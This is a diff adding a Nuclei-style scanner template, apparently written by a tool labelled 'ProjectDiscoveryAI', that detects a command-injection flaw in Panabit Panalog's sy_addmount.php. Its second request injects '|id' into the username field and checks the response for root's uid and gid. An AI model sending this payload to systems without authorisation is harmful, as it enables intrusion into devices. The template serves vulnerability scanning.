@@ -1,0 +1,47 @@
+id: panabit-panalog-sy-addmount-rce
+info:
+  name: Panabit Panalog sy_addmount.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+
+http:
+  - raw:
+      - |
+        GET /account/sy_addmount.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"success":"no", "out":"NO_USER"}'
+        part: body
+
+  - raw:
+      - |
+        POST /account/sy_addmount.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=|id
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid"
+          - "root"
+          - "gid"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
